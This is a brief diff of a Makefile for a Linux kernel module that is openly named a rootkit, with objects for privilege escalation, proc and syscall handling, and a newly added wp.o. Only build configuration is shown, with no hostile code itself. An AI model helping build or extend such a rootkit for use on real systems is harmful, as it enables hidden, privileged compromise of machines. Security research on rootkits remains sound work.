@@ -13,6 +13,8 @@ $(ROOTKIT)-y += privesc.o
 $(ROOTKIT)-y += proc.o
 $(ROOTKIT)-y += syscall.o
 $(ROOTKIT)-y += util.o
+$(ROOTKIT)-y += wp.o
+
 
 all:
 	make -C /lib/modules/$(KVERSION)/build M=$(PWD) modules
